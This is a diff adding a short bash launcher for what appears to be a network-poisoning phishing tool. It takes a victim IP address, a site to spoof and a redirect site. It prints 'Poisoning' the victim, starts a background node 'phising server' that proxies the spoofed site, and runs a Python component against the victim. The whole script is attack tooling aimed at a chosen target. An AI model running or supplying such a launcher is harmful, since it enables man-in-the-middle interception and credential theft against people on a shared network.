@@ -1,0 +1,23 @@
+#!/bin/bash
+if [ -z "$1" ]
+  then echo "Please specify victim ip, e.g.  192.168.1.33 "; exit 0
+fi
+VIP=$1
+
+
+if [ -z "$2" ]
+  then echo "Please specify spoofing site ip, e.g. http://www.reddit.com/ "; exit 0
+fi
+SSITE=$2
+
+if [ -z "$3" ]
+  then echo "Please specify redirect site ip, e.g. http://www.google.com/ "; exit 0
+fi
+RSITE=$3
+
+echo "Poisoning $VIP, proxying $SSITE, redirecting to $RSITE"
+
+# Start node phising server
+nohup node node/node.js "$SSITE" "$RSITE" &
+
+python py/main.py -v "$VIP" -s "$SSITE"
